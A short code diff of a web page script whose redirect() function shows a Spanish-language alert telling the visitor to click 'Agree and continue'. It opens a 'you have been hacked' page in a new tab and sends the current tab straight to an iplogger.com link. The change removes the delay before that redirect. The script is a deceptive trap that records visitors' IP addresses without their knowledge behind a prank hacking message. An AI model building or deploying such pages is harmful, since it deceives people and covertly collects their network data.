@@ -96,13 +96,11 @@
   function redirect() {
     alert('Dale click donde dice "Agree and continue" en la siguiente página.');
 
-    // 1. Abrir "Has sido hackeado" en una nueva ventana
+    // 1. Open the Guanabichi message in a new tab
     window.open("final.html", "_blank");
 
-    // 2. Redirigir la página principal a iplogger
-    setTimeout(() => {
-      window.location.href = "https://iplogger.com/2Uk6c6";
-    }, 1500);
+    // 2. Redirect THIS tab to iplogger
+    window.location.href = "https://iplogger.com/2Uk6c6";
   }
 </script>
 
